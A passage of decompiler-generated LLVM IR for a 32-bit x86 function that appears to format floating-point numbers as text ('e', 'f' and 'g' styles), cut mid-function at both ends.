  %v1_804f3ef = add i32 %tmp112, 12
  %v2_804f3ef = inttoptr i32 %v1_804f3ef to i32*
  %v3_804f3ef = load i32, i32* %v2_804f3ef, align 4
  store i32 %v3_804f3ef, i32* %eax.global-to-local, align 4
  %v2_804f3f2 = and i32 %v3_804f3ef, 2
  %v3_804f3f2 = icmp eq i32 %v2_804f3f2, 0
  br i1 %v3_804f3f2, label %dec_label_pc_804f400, label %dec_label_pc_804f40c

dec_label_pc_804f400:                             ; preds = %dec_label_pc_804f3e0
  %v2_804f400 = urem i32 %v3_804f3ef, 2
  %tmp143 = trunc i32 %v2_804f400 to i8
  %tmp = sub nsw i8 0, %tmp143
  %tmp144 = and i8 %tmp, 32
  br label %dec_label_pc_804f40c

dec_label_pc_804f40c:                             ; preds = %dec_label_pc_804f400, %dec_label_pc_804f3e0
  %stack_var_-26.0 = phi i8 [ 32, %dec_label_pc_804f3e0 ], [ %tmp144, %dec_label_pc_804f400 ]
  %v1_804f420 = udiv i32 %v3_804f3ef, 256
  %tmp146 = and i32 %v1_804f420, 68
  %tmp147 = icmp eq i32 %tmp146, 64
  br i1 %tmp147, label %dec_label_pc_804f572, label %dec_label_pc_804f492

dec_label_pc_804f492:                             ; preds = %dec_label_pc_804f40c
  store i3 %v4_804f3a8, i3* %fpu_stat_TOP.global-to-local, align 1
  store i32 %tmp112, i32* %edx.global-to-local, align 4
  %v1_804f499 = add i32 %tmp112, 16
  %v2_804f499 = inttoptr i32 %v1_804f499 to i32*
  store i32 32, i32* %v2_804f499, align 4
  store i32 3, i32* %stack_var_-152, align 4
  %v4_804f4b0 = add i8 %stack_var_-206.0, -96
  %v6_804f4b0 = sub i8 95, %stack_var_-206.0
  %v7_804f4b0 = and i8 %v6_804f4b0, %stack_var_-206.0
  %v8_804f4b0 = icmp slt i8 %v7_804f4b0, 0
  %v9_804f4b0 = icmp eq i8 %v4_804f4b0, 0
  %v10_804f4b0 = icmp slt i8 %v4_804f4b0, 0
  %v3_804f4b5 = icmp eq i1 %v10_804f4b0, %v8_804f4b0
  %v4_804f4b5 = icmp eq i1 %v9_804f4b0, false
  %v5_804f4b5 = and i1 %v4_804f4b5, %v3_804f4b5
  br i1 %v5_804f4b5, label %dec_label_pc_804f4bc, label %dec_label_pc_804f4b7

dec_label_pc_804f4b7:                             ; preds = %dec_label_pc_804f492
  br label %dec_label_pc_804f4bc

dec_label_pc_804f4bc:                             ; preds = %dec_label_pc_804f492, %dec_label_pc_804f4b7
  %v2_804f4c4 = ptrtoint i32* %stack_var_-144 to i32
  store i32 %v2_804f4c4, i32* @ecx, align 4
  br label %dec_label_pc_804f897

dec_label_pc_804f572:                             ; preds = %dec_label_pc_804f40c
  %v1_804f431 = add i3 %v4_804f3a8, -2
  store x86_fp80 0xK3FFF8000000000000000, x86_fp80* %st0.global-to-local, align 4
  %v6_804f576 = and i32 %v3_804f3ef, -65536
  %v2_804f57b = ptrtoint i32* %stack_var_-70 to i32
  store i32 %v2_804f57b, i32* %edx.global-to-local, align 4
  %v1_804f582 = udiv i16 %tmp103, 256
  %v2_804f582 = zext i16 %v1_804f582 to i32
  %v3_804f582 = mul nuw nsw i32 %v2_804f582, 256
  %tmp148 = urem i16 %tmp103, 256
  %v4_804f576.masked = zext i16 %tmp148 to i32
  %v11_804f582 = or i32 %v4_804f576.masked, %v3_804f582
  %v10_804f582 = or i32 %v11_804f582, %v6_804f576
  %v12_804f582 = or i32 %v10_804f582, 3072
  store i32 %v12_804f582, i32* %eax.global-to-local, align 4
  store i32 0, i32* @edi, align 4
  store x86_fp80 0xK401CEE6B280000000000, x86_fp80* %st1.global-to-local, align 4
  store i3 %v1_804f431, i3* %fpu_stat_TOP.global-to-local, align 1
  br label %dec_label_pc_804f596

dec_label_pc_804f596:                             ; preds = %dec_label_pc_804f5e7.dec_label_pc_804f596_crit_edge, %dec_label_pc_804f572
  %v2_804f5b3 = phi x86_fp80 [ 0xK3FFF8000000000000000, %dec_label_pc_804f572 ], [ %v2_804f5b3.pre, %dec_label_pc_804f5e7.dec_label_pc_804f596_crit_edge ]
  %v1_804f596 = phi i3 [ %v1_804f431, %dec_label_pc_804f572 ], [ %v1_804f596.pre, %dec_label_pc_804f5e7.dec_label_pc_804f596_crit_edge ]
  %v3_804f5bd = phi x86_fp80 [ 0xK401CEE6B280000000000, %dec_label_pc_804f572 ], [ %v0_804f596.pre, %dec_label_pc_804f5e7.dec_label_pc_804f596_crit_edge ]
  %stack_var_-212.0 = phi i32 [ %v2_804f57b, %dec_label_pc_804f572 ], [ %v4_804f5b8, %dec_label_pc_804f5e7.dec_label_pc_804f596_crit_edge ]
  store i32 0, i32* %edx.global-to-local, align 4
  store i32 0, i32* %esi.global-to-local, align 4
  %tmp149 = fptosi x86_fp80 %v3_804f5bd to i32
  store i32 %tmp149, i32* %eax.global-to-local, align 4
  store i32 %tmp149, i32* %ebx.global-to-local, align 4
  %v5_804f5b0 = sitofp i32 %tmp149 to x86_fp80
  %v4_804f5b3 = fsub x86_fp80 %v2_804f5b3, %v5_804f5b0
  store i3 %v1_804f596, i3* %fpu_stat_TOP.global-to-local, align 1
  %v4_804f5b8 = add i32 %stack_var_-212.0, 9
  %v4_804f5bd = fmul x86_fp80 %v3_804f5bd, %v4_804f5b3
  store x86_fp80 %v4_804f5bd, x86_fp80* %st0.global-to-local, align 4
  br label %dec_label_pc_804f5bf

dec_label_pc_804f5bf:                             ; preds = %dec_label_pc_804f5bf.dec_label_pc_804f5bf_crit_edge, %dec_label_pc_804f596
  %v0_804f5d1 = phi i32 [ %v0_804f5d1.pre, %dec_label_pc_804f5bf.dec_label_pc_804f5bf_crit_edge ], [ %tmp149, %dec_label_pc_804f596 ]
  %v0_804f5bf = phi i32 [ %v0_804f5bf.pre, %dec_label_pc_804f5bf.dec_label_pc_804f5bf_crit_edge ], [ 0, %dec_label_pc_804f596 ]
  %v1_804f5bf = add i32 %v0_804f5bf, 1
  store i32 %v1_804f5bf, i32* %esi.global-to-local, align 4
  %v2_804f5c4 = sub i32 %v4_804f5b8, %v1_804f5bf
  store i32 10, i32* %ecx.global-to-local, align 4
  %div = udiv i32 %v0_804f5d1, 10
  %tmp136 = urem i32 %v0_804f5d1, 10
  store i32 %div, i32* %ebx.global-to-local, align 4
  store i32 %v2_804f5c4, i32* %eax.global-to-local, align 4
  %v1_804f5dd = or i32 %tmp136, 48
  %v8_804f5dd = trunc i32 %v1_804f5dd to i8
  store i32 %v1_804f5dd, i32* %edx.global-to-local, align 4
  %v3_804f5e3 = inttoptr i32 %v2_804f5c4 to i8*
  store i8 %v8_804f5dd, i8* %v3_804f5e3, align 1
  %v7_804f5e5 = icmp sgt i32 %v1_804f5bf, 8
  br i1 %v7_804f5e5, label %dec_label_pc_804f5e7, label %dec_label_pc_804f5bf.dec_label_pc_804f5bf_crit_edge

dec_label_pc_804f5bf.dec_label_pc_804f5bf_crit_edge: ; preds = %dec_label_pc_804f5bf
  %v0_804f5bf.pre = load i32, i32* %esi.global-to-local, align 4
  %v0_804f5d1.pre = load i32, i32* %ebx.global-to-local, align 4
  br label %dec_label_pc_804f5bf

dec_label_pc_804f5e7:                             ; preds = %dec_label_pc_804f5bf
  %v0_804f5e7 = load i32, i32* @edi, align 4
  %v1_804f5e7 = add i32 %v0_804f5e7, 1
  store i32 %v1_804f5e7, i32* @edi, align 4
  %v7_804f5eb = icmp sgt i32 %v1_804f5e7, 2
  br i1 %v7_804f5eb, label %dec_label_pc_804f5ed, label %dec_label_pc_804f5e7.dec_label_pc_804f596_crit_edge

dec_label_pc_804f5e7.dec_label_pc_804f596_crit_edge: ; preds = %dec_label_pc_804f5e7
  %v0_804f596.pre = load x86_fp80, x86_fp80* %st1.global-to-local, align 4
  %v1_804f596.pre = load i3, i3* %fpu_stat_TOP.global-to-local, align 1
  %v2_804f5b3.pre = load x86_fp80, x86_fp80* %st0.global-to-local, align 4
  br label %dec_label_pc_804f596

dec_label_pc_804f5ed:                             ; preds = %dec_label_pc_804f5e7
  %v0_804f5ed = load i3, i3* %fpu_stat_TOP.global-to-local, align 1
  %v1_804f5ed = load x86_fp80, x86_fp80* %st1.global-to-local, align 4
  store x86_fp80 %v1_804f5ed, x86_fp80* %st0.global-to-local, align 4
  %v2_804f5ef = add i3 %v0_804f5ed, 2
  store i3 %v2_804f5ef, i3* %fpu_stat_TOP.global-to-local, align 1
  %v4_804f5f1 = add i8 %stack_var_-206.0, -96
  %v6_804f5f1 = sub i8 95, %stack_var_-206.0
  %v7_804f5f1 = and i8 %v6_804f5f1, %stack_var_-206.0
  %v8_804f5f1 = icmp slt i8 %v7_804f5f1, 0
  %v9_804f5f1 = icmp eq i8 %v4_804f5f1, 0
  %v10_804f5f1 = icmp slt i8 %v4_804f5f1, 0
  %v3_804f5f6 = icmp eq i1 %v10_804f5f1, %v8_804f5f1
  %v4_804f5f6 = icmp eq i1 %v9_804f5f1, false
  %v5_804f5f6 = and i1 %v4_804f5f6, %v3_804f5f6
  br i1 %v5_804f5f6, label %dec_label_pc_804f605, label %dec_label_pc_804f5f8

dec_label_pc_804f5f8:                             ; preds = %dec_label_pc_804f5ed
  %v4_804f5f8 = add i8 %stack_var_-206.0, 32
  br label %dec_label_pc_804f605

dec_label_pc_804f605:                             ; preds = %dec_label_pc_804f5ed, %dec_label_pc_804f5f8
  %stack_var_-206.1 = phi i8 [ %stack_var_-206.0, %dec_label_pc_804f5ed ], [ %v4_804f5f8, %dec_label_pc_804f5f8 ]
  %stack_var_-42.0 = phi i32 [ 101, %dec_label_pc_804f5ed ], [ 69, %dec_label_pc_804f5f8 ]
  %v12_804f605 = icmp eq i8 %stack_var_-206.1, 103
  %v1_804f60a = icmp eq i1 %v12_804f605, false
  br i1 %v1_804f60a, label %dec_label_pc_804f613, label %dec_label_pc_804f60c

dec_label_pc_804f60c:                             ; preds = %dec_label_pc_804f605
  %v0_804f60c = load i32, i32* %ebp.global-to-local, align 4
  %tmp137 = icmp slt i32 %v0_804f60c, 1
  br i1 %tmp137, label %dec_label_pc_804f61a, label %dec_label_pc_804f610

dec_label_pc_804f610:                             ; preds = %dec_label_pc_804f60c
  %v1_804f610 = add i32 %v0_804f60c, -1
  store i32 %v1_804f610, i32* %ebp.global-to-local, align 4
  br label %dec_label_pc_804f61a

dec_label_pc_804f613:                             ; preds = %dec_label_pc_804f605
  %v12_804f613 = icmp eq i8 %stack_var_-206.1, 102
  br i1 %v12_804f613, label %dec_label_pc_804f61e, label %dec_label_pc_804f613.dec_label_pc_804f61a_crit_edge

dec_label_pc_804f613.dec_label_pc_804f61a_crit_edge: ; preds = %dec_label_pc_804f613
  %v0_804f61a.pre = load i32, i32* %ebp.global-to-local, align 4
  br label %dec_label_pc_804f61a

dec_label_pc_804f61a:                             ; preds = %dec_label_pc_804f613.dec_label_pc_804f61a_crit_edge, %dec_label_pc_804f60c, %dec_label_pc_804f610
  %v0_804f61a = phi i32 [ %v0_804f61a.pre, %dec_label_pc_804f613.dec_label_pc_804f61a_crit_edge ], [ %v0_804f60c, %dec_label_pc_804f60c ], [ %v1_804f610, %dec_label_pc_804f610 ]
  store i32 %v0_804f61a, i32* %ebx.global-to-local, align 4
  br label %dec_label_pc_804f64b

dec_label_pc_804f61e:                             ; preds = %dec_label_pc_804f613
  store i32 -1, i32* %edx.global-to-local, align 4
  %v0_804f622 = load i32, i32* %ebp.global-to-local, align 4
  %v2_804f622 = add i32 %v0_804f622, -1
  store i32 %v2_804f622, i32* %ebx.global-to-local, align 4
  %v5_804f629 = icmp slt i32 %v2_804f622, -1
  br i1 %v5_804f629, label %dec_label_pc_804f62b, label %dec_label_pc_804f64b

dec_label_pc_804f62b:                             ; preds = %dec_label_pc_804f61e
  store i32 -1, i32* %ebx.global-to-local, align 4
  %v2_804f633 = ptrtoint i32* %stack_var_-72 to i32
  store i32 %v2_804f633, i32* %eax.global-to-local, align 4
  %v4_804f63b = bitcast i32* %stack_var_-72 to i8*
  %v5_804f63b = call i32 @__GI_memset(i8* %v4_804f63b, i32 48, i32 21)
  store i32 %v5_804f63b, i32* %eax.global-to-local, align 4
  %v0_804f65b.pr.pre = load i32, i32* %ebx.global-to-local, align 4
  br label %dec_label_pc_804f64b

dec_label_pc_804f64b:                             ; preds = %dec_label_pc_804f61e, %dec_label_pc_804f62b, %dec_label_pc_804f61a
  %v1_804f66b = phi i32 [ %v0_804f61a, %dec_label_pc_804f61a ], [ %v0_804f65b.pr.pre, %dec_label_pc_804f62b ], [ %v2_804f622, %dec_label_pc_804f61e ]
  store i32 0, i32* %stack_var_-72, align 4
  store i32 48, i32* %stack_var_-71, align 4
  %v7_804f65e = icmp sgt i32 %v1_804f66b, 20
  br i1 %v7_804f65e, label %dec_label_pc_804f660, label %dec_label_pc_804f66b

dec_label_pc_804f660:                             ; preds = %dec_label_pc_804f64b
  %v2_804f660 = ptrtoint i32* %stack_var_-49 to i32
  store i32 %v2_804f660, i32* %ecx.global-to-local, align 4
  br label %dec_label_pc_804f67f.preheader

dec_label_pc_804f66b:                             ; preds = %dec_label_pc_804f64b
  %v0_804f66b = load i32, i32* @esp, align 4
  %v2_804f66b = add i32 %v1_804f66b, 165
  %v3_804f66b = add i32 %v2_804f66b, %v0_804f66b
  store i32 %v3_804f66b, i32* %eax.global-to-local, align 4
  %v1_804f672 = add i32 %v3_804f66b, 2
  store i32 %v1_804f672, i32* %ecx.global-to-local, align 4
  %v2_804f675 = inttoptr i32 %v1_804f672 to i8*
  %v3_804f675 = load i8, i8* %v2_804f675, align 1
  %v4_804f675 = add i8 %v3_804f675, -53
  %v9_804f675 = sub i8 52, %v3_804f675
  %v10_804f675 = and i8 %v9_804f675, %v3_804f675
  %v11_804f675 = icmp slt i8 %v10_804f675, 0
  %v13_804f675 = icmp slt i8 %v4_804f675, 0
  %v2_804f679 = icmp eq i1 %v13_804f675, %v11_804f675
  %v3_804f679 = zext i1 %v2_804f679 to i32
  br label %dec_label_pc_804f67f.preheader

dec_label_pc_804f67f.preheader:                   ; preds = %dec_label_pc_804f66b, %dec_label_pc_804f660
  %v0_804f67f63 = phi i32 [ %v1_804f672, %dec_label_pc_804f66b ], [ %v2_804f660, %dec_label_pc_804f660 ]
  %storemerge52 = phi i32 [ %v3_804f679, %dec_label_pc_804f66b ], [ 0, %dec_label_pc_804f660 ]
  store i32 %storemerge52, i32* %eax.global-to-local, align 4
  br label %dec_label_pc_804f67f

dec_label_pc_804f67f:                             ; preds = %dec_label_pc_804f67f.backedge, %dec_label_pc_804f67f.preheader
  %v3_804f680 = phi i32 [ %v3_804f680.pre, %dec_label_pc_804f67f.backedge ], [ %storemerge52, %dec_label_pc_804f67f.preheader ]
  %v0_804f67f = phi i32 [ %v0_804f682, %dec_label_pc_804f67f.backedge ], [ %v0_804f67f63, %dec_label_pc_804f67f.preheader ]
  %v1_804f67f = add i32 %v0_804f67f, -1
  store i32 %v1_804f67f, i32* %ecx.global-to-local, align 4
  %v1_804f680 = inttoptr i32 %v1_804f67f to i8*
  %v2_804f680 = load i8, i8* %v1_804f680, align 1
  %v4_804f680 = trunc i32 %v3_804f680 to i8
  %v5_804f680 = add i8 %v2_804f680, %v4_804f680
  store i8 %v5_804f680, i8* %v1_804f680, align 1
  %v0_804f682 = load i32, i32* %ecx.global-to-local, align 4
  %v1_804f682 = inttoptr i32 %v0_804f682 to i8*
  %v2_804f682 = load i8, i8* %v1_804f682, align 1
  %v3_804f682 = zext i8 %v2_804f682 to i32
  %v4_804f682 = load i32, i32* %edx.global-to-local, align 4
  %v5_804f682 = and i32 %v4_804f682, -256
  %v6_804f682 = or i32 %v5_804f682, %v3_804f682
  store i32 %v6_804f682, i32* %edx.global-to-local, align 4
  %v7_804f684 = icmp eq i8 %v2_804f682, 48
  br i1 %v7_804f684, label %dec_label_pc_804f67f.backedge, label %dec_label_pc_804f689

dec_label_pc_804f67f.backedge:                    ; preds = %dec_label_pc_804f67f, %dec_label_pc_804f689
  %v3_804f680.pre = load i32, i32* %eax.global-to-local, align 4
  br label %dec_label_pc_804f67f

dec_label_pc_804f689:                             ; preds = %dec_label_pc_804f67f
  %v2_804f689 = add i8 %v2_804f682, -57
  %v7_804f689 = sub i8 56, %v2_804f682
  %v8_804f689 = and i8 %v7_804f689, %v2_804f682
  %v9_804f689 = icmp slt i8 %v8_804f689, 0
  %v10_804f689 = icmp eq i8 %v2_804f689, 0
  %v11_804f689 = icmp slt i8 %v2_804f689, 0
  %v3_804f68c = icmp eq i1 %v11_804f689, %v9_804f689
  %v4_804f68c = icmp eq i1 %v10_804f689, false
  %v5_804f68c = and i1 %v4_804f68c, %v3_804f68c
  br i1 %v5_804f68c, label %dec_label_pc_804f67f.backedge, label %dec_label_pc_804f68e

dec_label_pc_804f68e:                             ; preds = %dec_label_pc_804f689
  %v2_804f68e = ptrtoint i32* %stack_var_-71 to i32
  store i32 %v2_804f68e, i32* %eax.global-to-local, align 4
  %tmp145 = icmp ugt i32 %v0_804f682, %v2_804f68e
  store i32 -1, i32* %esi.global-to-local, align 4
  br i1 %tmp145, label %dec_label_pc_804f699, label %dec_label_pc_804f6a6

dec_label_pc_804f699:                             ; preds = %dec_label_pc_804f68e
  store i32 %v2_804f57b, i32* %edx.global-to-local, align 4
  br label %dec_label_pc_804f6af

dec_label_pc_804f6a6:                             ; preds = %dec_label_pc_804f68e
  store i32 %v2_804f68e, i32* %edx.global-to-local, align 4
  store i32 0, i32* %esi.global-to-local, align 4
  store i32 %v2_804f68e, i32* %ecx.global-to-local, align 4
  br label %dec_label_pc_804f6af

dec_label_pc_804f6af:                             ; preds = %dec_label_pc_804f699, %dec_label_pc_804f6a6
  %v0_804f6af = phi i32 [ %v0_804f682, %dec_label_pc_804f699 ], [ %v2_804f68e, %dec_label_pc_804f6a6 ]
  %v1_804f6af = add i32 %v0_804f6af, 1
  store i32 %v1_804f6af, i32* %eax.global-to-local, align 4
  %v2_804f6b6 = inttoptr i32 %v1_804f6af to i8*
  store i8 0, i8* %v2_804f6b6, align 1
  br i1 %v1_804f60a, label %dec_label_pc_804f6dc, label %dec_label_pc_804f6c1

dec_label_pc_804f6c1:                             ; preds = %dec_label_pc_804f6af
  %v0_804f6c1 = load i32, i32* %esi.global-to-local, align 4
  %v5_804f6c4 = icmp slt i32 %v0_804f6c1, -4
  br i1 %v5_804f6c4, label %dec_label_pc_804f6e9, label %dec_label_pc_804f6c6

dec_label_pc_804f6c6:                             ; preds = %dec_label_pc_804f6c1
  %v1_804f6c6 = load i32, i32* %ebx.global-to-local, align 4
  %v7_804f6c8 = icmp slt i32 %v1_804f6c6, %v0_804f6c1
  br i1 %v7_804f6c8, label %dec_label_pc_804f6e9, label %dec_label_pc_804f6d1

dec_label_pc_804f6d1:                             ; preds = %dec_label_pc_804f6c6
  %v2_804f6d8 = sub i32 %v1_804f6c6, %v0_804f6c1
  store i32 %v2_804f6d8, i32* %ebp.global-to-local, align 4
  br label %dec_label_pc_804f6ed

dec_label_pc_804f6dc:                             ; preds = %dec_label_pc_804f6af
  %v4_804f6dc = zext i8 %stack_var_-206.1 to i32
  %v5_804f6dc = load i32, i32* %ecx.global-to-local, align 4
  %v6_804f6dc = and i32 %v5_804f6dc, -256
  %v7_804f6dc = or i32 %v6_804f6dc, %v4_804f6dc
  store i32 %v7_804f6dc, i32* %ecx.global-to-local, align 4
  %v10_804f6e4 = icmp eq i8 %stack_var_-206.1, 102
  br i1 %v10_804f6e4, label %dec_label_pc_804f6dc.dec_label_pc_804f6ed_crit_edge, label %dec_label_pc_804f6e9

dec_label_pc_804f6dc.dec_label_pc_804f6ed_crit_edge: ; preds = %dec_label_pc_804f6dc
  %v0_804f6ed.pre = load i32, i32* %esi.global-to-local, align 4
  br label %dec_label_pc_804f6ed

dec_label_pc_804f6e9:                             ; preds = %dec_label_pc_804f6c1, %dec_label_pc_804f6c6, %dec_label_pc_804f6dc
  %stack_var_-197.0 = phi i8 [ %stack_var_-206.1, %dec_label_pc_804f6dc ], [ 103, %dec_label_pc_804f6c6 ], [ 103, %dec_label_pc_804f6c1 ]
  store i32 0, i32* %ebx.global-to-local, align 4
  br label %dec_label_pc_804f6f7

dec_label_pc_804f6ed:                             ; preds = %dec_label_pc_804f6dc.dec_label_pc_804f6ed_crit_edge, %dec_label_pc_804f6d1
  %v0_804f6ed = phi i32 [ %v0_804f6ed.pre, %dec_label_pc_804f6dc.dec_label_pc_804f6ed_crit_edge ], [ %v0_804f6c1, %dec_label_pc_804f6d1 ]
  store i32 %v0_804f6ed, i32* %ebx.global-to-local, align 4
  %v2_804f6ef = icmp slt i32 %v0_804f6ed, 0
  %v1_804f6f1 = icmp eq i1 %v2_804f6ef, false
  br i1 %v1_804f6f1, label %dec_label_pc_804f6f7, label %dec_label_pc_804f6f3

dec_label_pc_804f6f3:                             ; preds = %dec_label_pc_804f6ed
  %v0_804f6f3 = load i32, i32* %edx.global-to-local, align 4
  %v1_804f6f3 = add i32 %v0_804f6f3, -1
  store i32 %v1_804f6f3, i32* %edx.global-to-local, align 4
  %v1_804f6f4 = inttoptr i32 %v1_804f6f3 to i8*
  store i8 48, i8* %v1_804f6f4, align 1
  %v0_804f72c.pre = load i32, i32* %ebx.global-to-local, align 4
  br label %dec_label_pc_804f6f7

dec_label_pc_804f6f7:                             ; preds = %dec_label_pc_804f6ed, %dec_label_pc_804f6e9, %dec_label_pc_804f6f3
  %v1_804f787 = phi i32 [ %v0_804f6ed, %dec_label_pc_804f6ed ], [ %v0_804f72c.pre, %dec_label_pc_804f6f3 ], [ 0, %dec_label_pc_804f6e9 ]
  %stack_var_-197.2 = phi i8 [ 102, %dec_label_pc_804f6ed ], [ 102, %dec_label_pc_804f6f3 ], [ %stack_var_-197.0, %dec_label_pc_804f6e9 ]
  %v2_804f6f7 = ptrtoint i32* %stack_var_-22 to i32
  store i32 %v2_804f6f7, i32* %eax.global-to-local, align 4
  store i32 1, i32* %stack_var_-152, align 4
  %v0_804f712 = load i32, i32* %edx.global-to-local, align 4
  %v1_804f712 = inttoptr i32 %v0_804f712 to i8*
  %v2_804f712 = load i8, i8* %v1_804f712, align 1
  %v3_804f712 = zext i8 %v2_804f712 to i32
  %v5_804f712 = and i32 %v2_804f6f7, -256
  %v6_804f712 = or i32 %v3_804f712, %v5_804f712
  store i32 %v6_804f712, i32* %eax.global-to-local, align 4
  %v1_804f714 = add i32 %v0_804f712, 1
  store i32 %v1_804f714, i32* %edi.global-to-local, align 4
  store i32 %v6_804f712, i32* %stack_var_-22, align 4
  %v2_804f722 = sub i32 %v1_804f6af, %v1_804f714
  store i32 %v2_804f722, i32* %edx.global-to-local, align 4
  %v1_804f72c = icmp eq i32 %v1_804f787, 0
  %v2_804f72c = icmp slt i32 %v1_804f787, 0
  br i1 %v2_804f72c, label %dec_label_pc_804f77b, label %dec_label_pc_804f730

dec_label_pc_804f730:                             ; preds = %dec_label_pc_804f6f7
  store i32 112, i32* %stack_var_-144, align 4
  %v2_804f73c = sub i32 %v1_804f787, %v2_804f722
  %v8_804f73c = xor i32 %v2_804f722, %v1_804f787
  %v9_804f73c = xor i32 %v2_804f73c, %v1_804f787
  %v10_804f73c = and i32 %v9_804f73c, %v8_804f73c
  %v11_804f73c = icmp slt i32 %v10_804f73c, 0
  %v13_804f73c = icmp slt i32 %v2_804f73c, 0
  %v2_804f73e = icmp eq i1 %v13_804f73c, %v11_804f73c
  br i1 %v2_804f73e, label %dec_label_pc_804f740, label %dec_label_pc_804f774

dec_label_pc_804f740:                             ; preds = %dec_label_pc_804f730
  store i32 %v2_804f73c, i32* %eax.global-to-local, align 4
  %tmp138 = icmp slt i32 %v2_804f73c, 1
  %tmp139 = icmp eq i1 %tmp138, false
  br i1 %tmp139, label %dec_label_pc_804f755, label %dec_label_pc_804f770

dec_label_pc_804f755:                             ; preds = %dec_label_pc_804f740
  store i32 176, i32* %stack_var_-132, align 4
  br label %dec_label_pc_804f770

dec_label_pc_804f770:                             ; preds = %dec_label_pc_804f740, %dec_label_pc_804f755
  %storemerge10.in = phi i32* [ %stack_var_-120, %dec_label_pc_804f755 ], [ %stack_var_-132, %dec_label_pc_804f740 ]
  store i32 -1, i32* %ebx.global-to-local, align 4
  %storemerge10 = ptrtoint i32* %storemerge10.in to i32
  store i32 %storemerge10, i32* @ecx, align 4
  store i32 0, i32* %edx.global-to-local, align 4
  br label %dec_label_pc_804f790

dec_label_pc_804f774:                             ; preds = %dec_label_pc_804f730
  %v4_804f776 = icmp eq i1 %v1_804f72c, false
  br i1 %v4_804f776, label %dec_label_pc_804f781, label %dec_label_pc_804f778

dec_label_pc_804f778:                             ; preds = %dec_label_pc_804f774
  store i32 -1, i32* %ebx.global-to-local, align 4
  br label %dec_label_pc_804f77b

dec_label_pc_804f77b:                             ; preds = %dec_label_pc_804f6f7, %dec_label_pc_804f778
  %v0_804f7c373 = phi i32 [ %v1_804f787, %dec_label_pc_804f6f7 ], [ -1, %dec_label_pc_804f778 ]
  %v2_804f77b = ptrtoint i32* %stack_var_-144 to i32
  store i32 %v2_804f77b, i32* @ecx, align 4
  br label %dec_label_pc_804f790

dec_label_pc_804f781:                             ; preds = %dec_label_pc_804f774
  %v2_804f785 = add i32 %v1_804f714, %v1_804f787
  store i32 %v2_804f785, i32* %edi.global-to-local, align 4
  %v2_804f787 = sub i32 %v2_804f722, %v1_804f787
  store i32 %v2_804f787, i32* %edx.global-to-local, align 4
  %v2_804f789 = ptrtoint i32* %stack_var_-132 to i32
  store i32 %v2_804f789, i32* @ecx, align 4
  store i32 -1, i32* %ebx.global-to-local, align 4
  br label %dec_label_pc_804f790

dec_label_pc_804f790:                             ; preds = %dec_label_pc_804f77b, %dec_label_pc_804f770, %dec_label_pc_804f781
  %v0_804f7c372 = phi i32 [ %v0_804f7c373, %dec_label_pc_804f77b ], [ -1, %dec_label_pc_804f770 ], [ -1, %dec_label_pc_804f781 ]
  %v0_804f7ac = phi i32 [ %v2_804f77b, %dec_label_pc_804f77b ], [ %storemerge10, %dec_label_pc_804f770 ], [ %v2_804f789, %dec_label_pc_804f781 ]
  %v0_804f79d = phi i32 [ %v2_804f722, %dec_label_pc_804f77b ], [ 0, %dec_label_pc_804f770 ], [ %v2_804f787, %dec_label_pc_804f781 ]
  store i32 %tmp112, i32* %eax.global-to-local, align 4
  %v2_804f797 = inttoptr i32 %v1_804f3ef to i8*
  %v3_804f797 = load i8, i8* %v2_804f797, align 1
  %v4_804f797 = and i8 %v3_804f797, 16
  %v5_804f797 = icmp eq i8 %v4_804f797, 0
  %v1_804f79b = icmp eq i1 %v5_804f797, false
  br i1 %v1_804f79b, label %dec_label_pc_804f7ac, label %dec_label_pc_804f79d

dec_label_pc_804f79d:                             ; preds = %dec_label_pc_804f790
  %v1_804f79d = icmp eq i32 %v0_804f79d, 0
  %v1_804f79f = icmp eq i1 %v1_804f79d, false
  br i1 %v1_804f79f, label %dec_label_pc_804f7ac, label %dec_label_pc_804f7a1

dec_label_pc_804f7a1:                             ; preds = %dec_label_pc_804f79d
  br i1 %v12_804f605, label %dec_label_pc_804f7c3, label %dec_label_pc_804f7a8

dec_label_pc_804f7a8:                             ; preds = %dec_label_pc_804f7a1
  %v0_804f7a8 = load i32, i32* %ebp.global-to-local, align 4
  %tmp140 = icmp slt i32 %v0_804f7a8, 1
  br i1 %tmp140, label %dec_label_pc_804f7c3, label %dec_label_pc_804f7ac

dec_label_pc_804f7ac:                             ; preds = %dec_label_pc_804f7a8, %dec_label_pc_804f79d, %dec_label_pc_804f790
  %v1_804f7ac = inttoptr i32 %v0_804f7ac to i32*
  store i32 112, i32* %v1_804f7ac, align 4
  %v0_804f7b2 = load i32, i32* @ecx, align 4
  %v1_804f7b2 = add i32 %v0_804f7b2, 4
  %v2_804f7b2 = inttoptr i32 %v1_804f7b2 to i32*
  store i32 1, i32* %v2_804f7b2, align 4
  %v0_804f7b9 = load i32, i32* @ecx, align 4
  %v1_804f7b9 = add i32 %v0_804f7b9, 8
  %v2_804f7b9 = inttoptr i32 %v1_804f7b9 to i32*
  store i32 ptrtoint (i32* @global_var_80515bc.133 to i32), i32* %v2_804f7b9, align 4
  %v0_804f7c0 = load i32, i32* @ecx, align 4
  %v1_804f7c0 = add i32 %v0_804f7c0, 12
  store i32 %v1_804f7c0, i32* @ecx, align 4
  %v0_804f7c3.pre = load i32, i32* %ebx.global-to-local, align 4
  br label %dec_label_pc_804f7c3

dec_label_pc_804f7c3:                             ; preds = %dec_label_pc_804f7a8, %dec_label_pc_804f7a1, %dec_label_pc_804f7ac
  %v0_804f7c8 = phi i32 [ %v0_804f7ac, %dec_label_pc_804f7a8 ], [ %v0_804f7ac, %dec_label_pc_804f7a1 ], [ %v1_804f7c0, %dec_label_pc_804f7ac ]
  %v0_804f7c3 = phi i32 [ %v0_804f7c372, %dec_label_pc_804f7a8 ], [ %v0_804f7c372, %dec_label_pc_804f7a1 ], [ %v0_804f7c3.pre, %dec_label_pc_804f7ac ]
  %v1_804f7c3 = add i32 %v0_804f7c3, 1
  %v8_804f7c3 = icmp eq i32 %v1_804f7c3, 0
  store i32 %v1_804f7c3, i32* %ebx.global-to-local, align 4
  br i1 %v8_804f7c3, label %dec_label_pc_804f7dd, label %dec_label_pc_804f7c6

dec_label_pc_804f7c6:                             ; preds = %dec_label_pc_804f7c3
  store i32 %v1_804f7c3, i32* %eax.global-to-local, align 4
  %v1_804f7c8 = inttoptr i32 %v0_804f7c8 to i32*
  store i32 176, i32* %v1_804f7c8, align 4
  %v0_804f7ce = load i32, i32* %eax.global-to-local, align 4
  %v1_804f7ce = sub i32 0, %v0_804f7ce
  store i32 %v1_804f7ce, i32* %eax.global-to-local, align 4
  %v1_804f7d0 = load i32, i32* @ecx, align 4
